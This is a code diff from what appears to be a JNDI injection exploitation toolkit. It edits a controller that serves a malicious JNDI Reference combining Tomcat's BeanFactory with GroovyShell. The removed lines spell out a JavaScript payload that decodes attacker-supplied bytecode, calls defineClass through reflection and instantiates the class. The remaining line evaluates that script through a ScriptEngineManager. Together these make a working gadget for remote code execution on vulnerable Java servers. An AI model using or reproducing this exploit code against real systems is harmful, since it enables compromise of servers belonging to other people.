@@ -4,9 +4,8 @@ import com.h2tg.ysogate.annotation.JNDIController;
 import com.h2tg.ysogate.annotation.JNDIMapping;
 import com.h2tg.ysogate.controller.BasicController;
 import org.apache.naming.ResourceRef;
-
 import javax.naming.StringRefAddr;
-import java.util.Base64;
+import static com.h2tg.ysogate.controller.bypass.converter.EvalConverter.LoadByJS2;
 
 @JNDIController
 @JNDIMapping("/GroovyShell")
@@ -16,12 +15,7 @@ public class GroovyShellController extends BasicController {
         byte[] byteCode = (byte[]) obj;
         System.out.println("[Reference] Factory: BeanFactory + GroovyShell");
 
-        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
-                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
-                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
-                "method.setAccessible(true);" +
-                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
-                "clazz.newInstance();";
+        String code = LoadByJS2(byteCode);
 
         String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\");";
 
